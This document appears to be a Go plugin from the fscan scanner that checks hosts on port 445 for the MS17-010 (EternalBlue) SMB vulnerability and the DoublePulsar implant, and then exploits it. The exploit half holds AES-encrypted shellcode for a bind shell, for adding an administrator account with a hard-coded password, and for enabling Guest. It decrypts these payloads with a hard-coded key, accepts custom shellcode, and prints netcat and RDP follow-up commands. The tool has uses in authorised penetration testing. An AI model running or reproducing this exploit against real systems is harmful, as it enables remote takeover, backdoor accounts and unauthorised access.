//go:build plugin_ms17010 || !plugin_selective

package services

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"strings"
	"time"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

// MS17010Plugin MS17-010漏洞检测和利用插件 - 保持完整的原始利用功能
type MS17010Plugin struct {
	plugins.BasePlugin
}

// NewMS17010Plugin 创建MS17010插件
func NewMS17010Plugin() *MS17010Plugin {
	return &MS17010Plugin{
		BasePlugin: plugins.NewBasePlugin("ms17010"),
	}
}

// GetPorts 实现Plugin接口

// Scan 执行MS17-010扫描
func (p *MS17010Plugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *ScanResult {
	target := info.Target()

	// 检查端口
	if info.Port != 445 {
		return &ScanResult{
			Success: false,
			Service: "ms17010",
			Error:   fmt.Errorf("MS17010漏洞检测仅支持445端口"),
		}
	}

	// 执行MS17010漏洞检测
	vulnerable, osVersion, hasBackdoor, err := p.checkMS17010Vulnerability(ctx, info.Host, session)
	if err != nil {
		return &ScanResult{
			Success: false,
			Service: "ms17010",
			Error:   err,
		}
	}

	if vulnerable {
		msg := fmt.Sprintf("MS17-010 %s", target)
		if osVersion != "" {
			msg += fmt.Sprintf(" [%s]", osVersion)
		}
		common.LogVuln(msg)
		if hasBackdoor {
			common.LogVuln(fmt.Sprintf("MS17-010 %s has DOUBLEPULSAR SMB IMPLANT", target))
		}

		return &ScanResult{
			Success: true,
			Type:    plugins.ResultTypeVuln,
			Service: "ms17010",
			Banner:  fmt.Sprintf("MS17-010漏洞 (%s)", osVersion),
		}
	}

	return &ScanResult{
		Success: false,
		Service: "ms17010",
		Error:   fmt.Errorf("目标不存在MS17-010漏洞"),
	}
}

// Exploit 执行MS17-010漏洞利用
func (p *MS17010Plugin) Exploit(ctx context.Context, info *common.HostInfo, creds Credential, session *common.ScanSession) *ExploitResult {
	config := session.Config
	target := info.Target()
	common.LogSuccess(i18n.Tr("ms17010_start", target))

	var output strings.Builder
	output.WriteString(fmt.Sprintf("=== MS17-010漏洞利用结果 - %s ===\n", target))

	// 首先确认漏洞存在
	vulnerable, osVersion, hasBackdoor, err := p.checkMS17010Vulnerability(ctx, info.Host, session)
	if err != nil {
		output.WriteString(fmt.Sprintf("\n[漏洞检测失败] %v\n", err))
		return &ExploitResult{
			Success: false,
			Output:  output.String(),
			Error:   err,
		}
	}

	if !vulnerable {
		output.WriteString("\n[漏洞状态] 目标不存在MS17-010漏洞\n")
		return &ExploitResult{
			Success: false,
			Output:  output.String(),
			Error:   fmt.Errorf("目标不存在MS17-010漏洞"),
		}
	}

	output.WriteString("\n[漏洞确认] ✅ MS17-010漏洞存在\n")
	if osVersion != "" {
		output.WriteString(fmt.Sprintf("[操作系统] %s\n", osVersion))
	}

	if hasBackdoor {
		output.WriteString("\n[后门检测] ⚠️  发现DOUBLEPULSAR后门\n")
	} else {
		output.WriteString("\n[后门检测] 未发现DOUBLEPULSAR后门\n")
	}

	// 如果有Shellcode配置，执行实际利用
	if config.Shellcode != "" {
		output.WriteString(fmt.Sprintf("\n[利用模式] %s\n", config.Shellcode))
		output.WriteString("[利用状态] 开始执行EternalBlue攻击...\n")

		// 执行实际的MS17010利用
		err = p.executeMS17010Exploit(info, session)
		if err != nil {
			output.WriteString(fmt.Sprintf("[利用结果] ❌ 利用失败: %v\n", err))
			return &ExploitResult{
				Success: false,
				Output:  output.String(),
				Error:   err,
			}
		}
		output.WriteString("[利用结果] ✅ 漏洞利用成功完成\n")

		// 根据不同类型提供后续操作建议
		switch config.Shellcode {
		case "bind":
			output.WriteString("\n[连接建议] 使用以下命令连接Bind Shell:\n")
			output.WriteString(fmt.Sprintf("  nc %s 64531\n", info.Host))
		case "add":
			output.WriteString("\n[访问建议] 已添加管理员账户，可以通过以下方式连接:\n")
			output.WriteString("  用户名: sysadmin  密码: 1qaz@WSX!@#4\n")
			output.WriteString(fmt.Sprintf("  RDP: mstsc /v:%s\n", info.Host))
		case "guest":
			output.WriteString("\n[访问建议] 已激活Guest账户，可以直接远程连接\n")
		}
	} else {
		output.WriteString("\n[利用模式] 仅检测模式 (未配置Shellcode)\n")
		output.WriteString("[建议] 可使用 -sc 参数配置Shellcode进行实际利用\n")
		output.WriteString("  支持的模式: bind, add, guest 或自定义shellcode\n")
	}

	common.LogSuccess(i18n.Tr("ms17010_complete", target))

	return &ExploitResult{
		Success: true,
		Output:  output.String(),
	}
}

// 以下是完整的原始MS17010检测和利用代码，保持不变

// AES解密函数 (从legacy/Base.go复制)
func aesDecrypt(crypted string, key string) (string, error) {
	cryptedBytes, err := base64.StdEncoding.DecodeString(crypted)
	if err != nil {
		return "", fmt.Errorf("base64解码失败: %w", err)
	}

	keyBytes := []byte(key)
	block, err := aes.NewCipher(keyBytes)
	if err != nil {
		return "", fmt.Errorf("创建AES密码块失败: %w", err)
	}

	if len(cryptedBytes) < aes.BlockSize {
		return "", fmt.Errorf("密文长度过短")
	}

	mode := cipher.NewCBCDecrypter(block, keyBytes[:aes.BlockSize])
	mode.CryptBlocks(cryptedBytes, cryptedBytes)

	// 移除PKCS7填充
	padding := int(cryptedBytes[len(cryptedBytes)-1])
	if padding > len(cryptedBytes) || padding > aes.BlockSize {
		return "", fmt.Errorf("无效的填充")
	}

	for i := len(cryptedBytes) - padding; i < len(cryptedBytes); i++ {
		if cryptedBytes[i] != byte(padding) {
			return "", fmt.Errorf("填充验证失败")
		}
	}

	return string(cryptedBytes[:len(cryptedBytes)-padding]), nil
}

// 默认AES解密密钥 (从legacy代码复制)
var defaultKey = "0123456789abcdef"

// SMB协议加密的请求数据 (从原始MS17010.go复制)
var (
	negotiateProtocolRequestEnc  = "G8o+kd/4y8chPCaObKK8L9+tJVFBb7ntWH/EXJ74635V3UTXA4TFOc6uabZfuLr0Xisnk7OsKJZ2Xdd3l8HNLdMOYZXAX5ZXnMC4qI+1d/MXA2TmidXeqGt8d9UEF5VesQlhP051GGBSldkJkVrP/fzn4gvLXcwgAYee3Zi2opAvuM6ScXrMkcbx200ThnOOEx98/7ArteornbRiXQjnr6dkJEUDTS43AW6Jl3OK2876Yaz5iYBx+DW5WjiLcMR+b58NJRxm4FlVpusZjBpzEs4XOEqglk6QIWfWbFZYgdNLy3WaFkkgDjmB1+6LhpYSOaTsh4EM0rwZq2Z4Lr8TE5WcPkb/JNsWNbibKlwtNtp94fIYvAWgxt5mn/oXpfUD"
	sessionSetupRequestEnc       = "52HeCQEbsSwiSXg98sdD64qyRou0jARlvfQi1ekDHS77Nk/8dYftNXlFahLEYWIxYYJ8u53db9OaDfAvOEkuox+p+Ic1VL70r9Q5HuL+NMyeyeN5T5el07X5cT66oBDJnScs1XdvM6CBRtj1kUs2h40Z5Vj9EGzGk99SFXjSqbtGfKFBp0DhL5wPQKsoiXYLKKh9NQiOhOMWHYy/C+Iwhf3Qr8d1Wbs2vgEzaWZqIJ3BM3z+dhRBszQoQftszC16TUhGQc48XPFHN74VRxXgVe6xNQwqrWEpA4hcQeF1+QqRVHxuN+PFR7qwEcU1JbnTNISaSrqEe8GtRo1r2rs7+lOFmbe4qqyUMgHhZ6Pwu1bkhrocMUUzWQBogAvXwFb8"
	treeConnectRequestEnc        = "+b/lRcmLzH0c0BYhiTaYNvTVdYz1OdYYDKhzGn/3T3P4b6pAR8D+xPdlb7O4D4A9KMyeIBphDPmEtFy44rtto2dadFoit350nghebxbYA0pTCWIBd1kN0BGMEidRDBwLOpZE6Qpph/DlziDjjfXUz955dr0cigc9ETHD/+f3fELKsopTPkbCsudgCs48mlbXcL13GVG5cGwKzRuP4ezcdKbYzq1DX2I7RNeBtw/vAlYh6etKLv7s+YyZ/r8m0fBY9A57j+XrsmZAyTWbhPJkCg=="
	transNamedPipeRequestEnc     = "k/RGiUQ/tw1yiqioUIqirzGC1SxTAmQmtnfKd1qiLish7FQYxvE+h4/p7RKgWemIWRXDf2XSJ3K0LUIX0vv1gx2eb4NatU7Qosnrhebz3gUo7u25P5BZH1QKdagzPqtitVjASpxIjB3uNWtYMrXGkkuAm8QEitberc+mP0vnzZ8Nv/xiiGBko8O4P/wCKaN2KZVDLbv2jrN8V/1zY6fvWA=="
	trans2SessionSetupRequestEnc = "JqNw6PUKcWOYFisUoUCyD24wnML2Yd8kumx9hJnFWbhM2TQkRvKHsOMWzPVfggRrLl8sLQFqzk8bv8Rpox3uS61l480Mv7HdBPeBeBeFudZMntXBUa4pWUH8D9EXCjoUqgAdvw6kGbPOOKUq3WmNb0GDCZapqQwyUKKMHmNIUMVMAOyVfKeEMJA6LViGwyvHVMNZ1XWLr0xafKfEuz4qoHiDyVWomGjJt8DQd6+jgLk="

	// SMB协议解密后的请求数据
	negotiateProtocolRequest  []byte
	sessionSetupRequest       []byte
	treeConnectRequest        []byte
	transNamedPipeRequest     []byte
	trans2SessionSetupRequest []byte
)

// 初始化解密SMB协议数据
func init() {
	var err error

	// 解密协议请求
	decrypted, err := aesDecrypt(negotiateProtocolRequestEnc, defaultKey)
	if err != nil {
		common.LogError(i18n.Tr("ms17010_protocol_decrypt_error", err))
		return
	}
	negotiateProtocolRequest, err = hex.DecodeString(decrypted)
	if err != nil {
		common.LogError(i18n.Tr("ms17010_protocol_decode_error", err))
		return
	}

	// 解密会话请求
	decrypted, err = aesDecrypt(sessionSetupRequestEnc, defaultKey)
	if err != nil {
		common.LogError(i18n.Tr("ms17010_session_decrypt_error", err))
		return
	}
	sessionSetupRequest, err = hex.DecodeString(decrypted)
	if err != nil {
		common.LogError(i18n.Tr("ms17010_session_decode_error", err))
		return
	}

	// 解密连接请求
	decrypted, err = aesDecrypt(treeConnectRequestEnc, defaultKey)
	if err != nil {
		common.LogError(i18n.Tr("ms17010_connect_decrypt_error", err))
		return
	}
	treeConnectRequest, err = hex.DecodeString(decrypted)
	if err != nil {
		common.LogError(i18n.Tr("ms17010_connect_decode_error", err))
		return
	}

	// 解密管道请求
	decrypted, err = aesDecrypt(transNamedPipeRequestEnc, defaultKey)
	if err != nil {
		common.LogError(i18n.Tr("ms17010_pipe_decrypt_error", err))
		return
	}
	transNamedPipeRequest, err = hex.DecodeString(decrypted)
	if err != nil {
		common.LogError(i18n.Tr("ms17010_pipe_decode_error", err))
		return
	}

	decrypted, err = aesDecrypt(trans2SessionSetupRequestEnc, defaultKey)
	if err != nil {
		common.LogError(i18n.Tr("ms17010_pipe_decrypt_error", err))
		return
	}
	trans2SessionSetupRequest, err = hex.DecodeString(decrypted)
	if err != nil {
		common.LogError(i18n.Tr("ms17010_pipe_decode_error", err))
		return
	}
}

// checkMS17010Vulnerability 检测MS17-010漏洞 (从原始MS17010.go复制和适配)
func (p *MS17010Plugin) checkMS17010Vulnerability(ctx context.Context, ip string, session *common.ScanSession) (bool, string, bool, error) {
	return p.checkMS17010VulnerabilityAt(ctx, net.JoinHostPort(ip, "445"), session)
}

func (p *MS17010Plugin) checkMS17010VulnerabilityAt(ctx context.Context, address string, session *common.ScanSession) (bool, string, bool, error) {
	conn, err := session.DialTCP(ctx, "tcp", address, session.Config.Timeout)
	if err != nil {
		return false, "", false, fmt.Errorf("连接错误: %w", err)
	}
	defer func() { _ = conn.Close() }()

	if err = conn.SetDeadline(time.Now().Add(session.Config.Timeout)); err != nil {
		return false, "", false, fmt.Errorf("设置超时错误: %w", err)
	}

	// SMB协议协商
	if _, err = conn.Write(negotiateProtocolRequest); err != nil {
		return false, "", false, fmt.Errorf("发送协议请求错误: %w", err)
	}

	reply := make([]byte, 1024)
	n, readErr := conn.Read(reply)
	if readErr != nil || n < 36 {
		// 连接被关闭或响应不完整，通常表示目标不支持SMBv1
		return false, "", false, fmt.Errorf("目标可能不支持SMBv1")
	}

	if binary.LittleEndian.Uint32(reply[9:13]) != 0 {
		return false, "", false, fmt.Errorf("SMBv1协议协商被拒绝")
	}

	// 建立会话
	if _, err = conn.Write(sessionSetupRequest); err != nil {
		return false, "", false, fmt.Errorf("发送会话请求错误: %w", err)
	}

	n, readErr = conn.Read(reply)
	if readErr != nil || n < 36 {
		return false, "", false, fmt.Errorf("SMB会话建立失败")
	}

	if binary.LittleEndian.Uint32(reply[9:13]) != 0 {
		return false, "", false, fmt.Errorf("SMB会话被拒绝")
	}

	// 提取系统信息
	var osVersion string
	sessionSetupResponse := reply[36:n]
	if len(sessionSetupResponse) > 0 && sessionSetupResponse[0] != 0 && len(sessionSetupResponse) >= 10 {
		byteCount := binary.LittleEndian.Uint16(sessionSetupResponse[7:9])
		if n == int(byteCount)+45 {
			for i := 10; i < len(sessionSetupResponse)-1; i++ {
				if sessionSetupResponse[i] == 0 && sessionSetupResponse[i+1] == 0 {
					osVersion = string(sessionSetupResponse[10:i])
					osVersion = strings.ReplaceAll(osVersion, string([]byte{0x00}), "")
					break
				}
			}
		}
	}

	// 树连接请求
	userID := reply[32:34]
	treeConnect := append([]byte(nil), treeConnectRequest...)
	treeConnect[32] = userID[0]
	treeConnect[33] = userID[1]

	if _, err = conn.Write(treeConnect); err != nil {
		return false, osVersion, false, fmt.Errorf("发送树连接请求错误: %w", err)
	}

	n, readErr = conn.Read(reply)
	if readErr != nil || n < 36 {
		if readErr != nil {
			return false, osVersion, false, fmt.Errorf("读取树连接响应错误: %w", readErr)
		}
		return false, osVersion, false, fmt.Errorf("树连接响应不完整")
	}

	// 命名管道请求
	treeID := reply[28:30]
	transNamedPipe := append([]byte(nil), transNamedPipeRequest...)
	transNamedPipe[28] = treeID[0]
	transNamedPipe[29] = treeID[1]
	transNamedPipe[32] = userID[0]
	transNamedPipe[33] = userID[1]

	if _, err = conn.Write(transNamedPipe); err != nil {
		return false, osVersion, false, fmt.Errorf("发送管道请求错误: %w", err)
	}

	n, readErr = conn.Read(reply)
	if readErr != nil || n < 36 {
		if readErr != nil {
			return false, osVersion, false, fmt.Errorf("读取管道响应错误: %w", readErr)
		}
		return false, osVersion, false, fmt.Errorf("管道响应不完整")
	}

	// 漏洞检测 - 关键检查点
	if reply[9] == 0x05 && reply[10] == 0x02 && reply[11] == 0x00 && reply[12] == 0xc0 {
		trans2SessionSetup := append([]byte(nil), trans2SessionSetupRequest...)
		trans2SessionSetup[28] = treeID[0]
		trans2SessionSetup[29] = treeID[1]
		trans2SessionSetup[32] = userID[0]
		trans2SessionSetup[33] = userID[1]

		if _, err = conn.Write(trans2SessionSetup); err != nil {
			return true, osVersion, false, nil
		}
		n, readErr = conn.Read(reply)
		if readErr != nil || n < 36 {
			return true, osVersion, false, nil
		}

		return true, osVersion, reply[34] == 0x51, nil
	}

	return false, osVersion, false, nil
}

// executeMS17010Exploit 执行MS17010漏洞利用
func (p *MS17010Plugin) executeMS17010Exploit(info *common.HostInfo, session *common.ScanSession) error {
	config := session.Config
	var sc string

	// 根据不同类型选择shellcode (从MS17010-Exp.go复制)
	switch config.Shellcode {
	case "bind":
		// Bind Shell shellcode (加密)
		scEnc := "gUYe7vm5/MQzTkSyKvpMFImS/YtwI+HxNUDd7MeUKDIxBZ8nsaUtdMEXIZmlZUfoQacylFEZpu7iWBRpQZw0KElIFkZR9rl4fpjyYNhEbf9JdquRrvw4hYMypBbfDQ6MN8csp1QF5rkMEs6HvtlKlGSaff34Msw6RlvEodROjGYA+mHUYvUTtfccymIqiU7hCFn+oaIk4ZtCS0Mzb1S5K5+U6vy3e5BEejJVA6u6I+EUb4AOSVVF8GpCNA91jWD1AuKcxg0qsMa+ohCWkWsOxh1zH0kwBPcWHAdHIs31g26NkF14Wl+DHStsW4DuNaxRbvP6awn+wD5aY/1QWlfwUeH/I+rkEPF18sTZa6Hr4mrDPT7eqh4UrcTicL/x4EgovNXA9X+mV6u1/4Zb5wy9rOVwJ+agXxfIqwL5r7R68BEPA/fLpx4LgvTwhvytO3w6I+7sZS7HekuKayBLNZ0T4XXeM8GpWA3h7zkHWjTm41/5JqWblQ45Msrg+XqD6WGvGDMnVZ7jE3xWIRBR7MrPAQ0Kl+Nd93/b+BEMwvuinXp1viSxEoZHIgJZDYR5DykQLpexasSpd8/WcuoQQtuTTYsJpHFfvqiwn0djgvQf3yk3Ro1EzjbR7a8UzwyaCqtKkCu9qGb+0m8JSpYS8DsjbkVST5Y7ZHtegXlX1d/FxgweavKGz3UiHjmbQ+FKkFF82Lkkg+9sO3LMxp2APvYz2rv8RM0ujcPmkN2wXE03sqcTfDdjCWjJ/evdrKBRzwPFhjOjUX1SBVsAcXzcvpJbAf3lcPPxOXM060OYdemu4Hou3oECjKP2h6W9GyPojMuykTkcoIqgN5Ldx6WpGhhE9wrfijOrrm7of9HmO568AsKRKBPfy/QpCfxTrY+rEwyzFmU1xZ2lkjt+FTnsMJY8YM7sIbWZauZ2S+Ux33RWDf7YUmSGlWC8djqDKammk3GgkSPHjf0Qgknukptxl977s2zw4jdh8bUuW5ap7T+Wd/S0ka90CVF4AyhonvAQoi0G1qj5gTih1FPTjBpf+FrmNJvNIAcx2oBoU4y48c8Sf4ABtpdyYewUh4NdxUoL7RSVouU1MZTnYS9BqOJWLMnvV7pwRmHgUz3fe7Kx5PGnP/0zQjW/P/vgmLMh/iBisJIGF3JDGoULsC3dabGE5L7sXuCNePiOEJmgwOHlFBlwqddNaE+ufor0q4AkQBI9XeqznUfdJg2M2LkUZOYrbCjQaE7Ytsr3WJSXkNbOORzqKo5wIf81z1TCow8QuwlfwIanWs+e8oTavmObV3gLPoaWqAIUzJqwD9O4P6x1176D0Xj83n6G4GrJgHpgMuB0qdlK"
		var err error
		sc, err = aesDecrypt(scEnc, defaultKey)
		if err != nil {
			return fmt.Errorf("解密bind shellcode失败: %w", err)
		}

	case "add":
		// 添加管理员账户 shellcode (加密)
		scEnc := "Teobs46+kgUn45BOBbruUdpBFXs8uKXWtvYoNbWtKpNCtOasHB/5Er+C2ZlALluOBkUC6BQVZHO1rKzuygxJ3n2PkeutispxSzGcvFS3QJ1EU517e2qOL7W2sRDlNb6rm+ECA2vQZkTZBAboolhGfZYeM6v5fEB2L1Ej6pWF5CKSYxjztdPF8bNGAkZsQhUAVW7WVKysZ1vbghszGyeKFQBvO9Hiinq/XiUrLBqvwXLsJaybZA44wUFvXC0FA9CZDOSD3MCX2arK6Mhk0Q+6dAR+NWPCQ34cYVePT98GyXnYapTOKokV6+hsqHMjfetjkvjEFohNrD/5HY+E73ihs9TqS1ZfpBvZvnWSOjLUA+Z3ex0j0CIUONCjHWpoWiXAsQI/ryJh7Ho5MmmGIiRWyV3l8Q0+1vFt3q/zQGjSI7Z7YgDdIBG8qcmfATJz6dx7eBS4Ntl+4CCqN8Dh4pKM3rV+hFqQyKnBHI5uJCn6qYky7p305KK2Z9Ga5nAqNgaz0gr2GS7nA5D/Cd8pvUH6sd2UmN+n4HnK6/O5hzTmXG/Pcpq7MTEy9G8uXRfPUQdrbYFP7Ll1SWy35B4n/eCf8swaTwi1mJEAbPr0IeYgf8UiOBKS/bXkFsnUKrE7wwG8xXaI7bHFgpdTWfdFRWc8jaJTvwK2HUK5u+4rWWtf0onGxTUyTilxgRFvb4AjVYH0xkr8mIq8smpsBN3ff0TcWYfnI2L/X1wJoCH+oLi67xOs7UApLzuCcE52FhTIjY+ckzBVinUHHwwc4QyY6Xo/15ATcQoL7ZiQgii3xFhrJQGnHgQBsmqT/0A1YBa+rrvIIzblF3FDRlXwAvUVTKnCjDJV9NeiS78jgtx6TNlBDyKCy29E3WGbMKSMH2a+dmtjBhmJ94O8GnbrHyd5c8zxsNXRBaYBV/tVyB9TDtM9kZk5QTit+xN2wOUwFa9cNbpYak8VH552mu7KISA1dUPAMQm9kF5vDRTRxjVLqpqHOc+36lNi6AWrGQkXNKcZJclmO7RotKdtPtCayNGV7/pznvewyGgEYvRKprmzf6hl+9acZmnyQZvlueWeqf+I6axiCyHqfaI+ADmz4RyJOlOC5s1Ds6uyNs+zUXCz7ty4rU3hCD8N6v2UagBJaP66XCiLOL+wcx6NJfBy40dWTq9RM0a6b448q3/mXZvdwzj1Evlcu5tDJHMdl+R2Q0a/1nahzsZ6UMJb9GAvMSUfeL9Cba77Hb5ZU40tyTQPl28cRedhwiISDq5UQsTRw35Z7bDAxJvPHiaC4hvfW3gA0iqPpkqcRfPEV7d+ylSTV1Mm9+NCS1Pn5VDIIjlClhlRf5l+4rCmeIPxQvVD/CPBM0NJ6y1oTzAGFN43kYqMV8neRAazACczYqziQ6VgjATzp0k8"
		var err error
		sc, err = aesDecrypt(scEnc, defaultKey)
		if err != nil {
			return fmt.Errorf("解密add shellcode失败: %w", err)
		}

	case "guest":
		// 激活Guest账户 shellcode (加密)
		scEnc := "Teobs46+kgUn45BOBbruUdpBFXs8uKXWtvYoNbWtKpNCtOasHB/5Er+C2ZlALluOBkUC6BQVZHO1rKzuygxJ3n2PkeutispxSzGcvFS3QJ1EU517e2qOL7W2sRDlNb6rm+ECA2vQZkTZBAboolhGfZYeM6v5fEB2L1Ej6pWF5CKSYxjztdPF8bNGAkZsQhUAVW7WVKysZ1vbghszGyeKFQBvO9Hiinq/XiUrLBqvwXLsJaybZA44wUFvXC0FA9CZDOSD3MCX2arK6Mhk0Q+6dAR+NWPCQ34cYVePT98GyXnYapTOKokV6+hsqHMjfetjkvjEFohNrD/5HY+E73ihs9TqS1ZfpBvZvnWSOjLUA+Z3ex0j0CIUONCjHWpoWiXAsQI/ryJh7Ho5MmmGIiRWyV3l8Q0+1vFt3q/zQGjSI7Z7YgDdIBG8qcmfATJz6dx7eBS4Ntl+4CCqN8Dh4pKM3rV+hFqQyKnBHI5uJCn6qYky7p305KK2Z9Ga5nAqNgaz0gr2GS7nA5D/Cd8pvUH6sd2UmN+n4HnK6/O5hzTmXG/Pcpq7MTEy9G8uXRfPUQdrbYFP7Ll1SWy35B4n/eCf8swaTwi1mJEAbPr0IeYgf8UiOBKS/bXkFsnUKrE7wwG8xXaI7bHFgpdTWfdFRWc8jaJTvwK2HUK5u+4rWWtf0onGxTUyTilxgRFvb4AjVYH0xkr8mIq8smpsBN3ff0TcWYfnI2L/X1wJoCH+oLi67xMN+yPDirT+LXfLOaGlyTqG6Yojge8Mti/BqIg5RpG4wIZPKxX9rPbMP+Tzw8rpi/9b33eq0YDevzqaj5Uo0HudOmaPwv5cd9/dqWgeC7FJwv73TckogZGbDOASSoLK26AgBat8vCrhrd7T0uBrEk+1x/NXvl5r2aEeWCWBsULKxFh2WDCqyQntSaAUkPe3JKJe0HU6inDeS4d52BagSqmd1meY0Rb/97fMCXaAMLekq+YrwcSrmPKBY9Yk0m1kAzY+oP4nvV/OhCHNXAsUQGH85G7k65I1QnzffroaKxloP26XJPW0JEq9vCSQFI/EX56qt323V/solearWdBVptG0+k55TBd0dxmBsqRMGO3Z23OcmQR4d8zycQUqqavMmo32fy4rjY6Ln5QUR0JrgJ67dqDhnJn5TcT4YFHgF4gY8oynT3sqv0a+hdVeF6XzsElUUsDGfxOLfkn3RW/2oNnqAHC2uXwX2ZZNrSbPymB2zxB/ET3SLlw3skBF1A82ZBYqkMIuzs6wr9S9ox9minLpGCBeTR9j6OYk6mmKZnThpvarRec8a7YBuT2miU7fO8iXjhS95A84Ub++uS4nC1Pv1v9nfj0/T8scD2BUYoVKCJX3KiVnxUYKVvDcbvv8UwrM6+W/hmNOePHJNx9nX1brHr90m9e40as1BZm2meUmCECxQd+Hdqs7HgPsPLcUB8AL8wCHQjziU6R4XKuX6ivx"
		var err error
		sc, err = aesDecrypt(scEnc, defaultKey)
		if err != nil {
			return fmt.Errorf("解密guest shellcode失败: %w", err)
		}

	case "cs":
		sc = ""

	default:
		// 从文件读取或直接使用提供的shellcode
		shellcode := config.Shellcode
		if strings.Contains(shellcode, "file:") {
			read, err := os.ReadFile(shellcode[5:])
			if err != nil {
				return fmt.Errorf("读取Shellcode文件失败: %w", err)
			}
			sc = fmt.Sprintf("%x", read)
		} else {
			sc = shellcode
		}
	}

	// 验证shellcode有效性
	if len(sc) < 20 {
		return fmt.Errorf("无效的Shellcode")
	}

	// 解码shellcode
	scBytes, err := hex.DecodeString(sc)
	if err != nil {
		return fmt.Errorf("shellcode解码失败: %w", err)
	}

	if err = eternalBlue(net.JoinHostPort(info.Host, "445"), 12, 12, scBytes); err != nil {
		return fmt.Errorf("MS17-010 exp failed: %w", err)
	}

	common.LogSuccess(i18n.Tr("ms17010_shellcode_complete", info.Host, len(scBytes)))
	return nil
}

// init 自动注册插件
func init() {
	// 使用高效注册方式：直接传递端口信息，避免实例创建
	RegisterPluginWithPorts("ms17010", func() Plugin {
		return NewMS17010Plugin()
	}, []int{445})
}
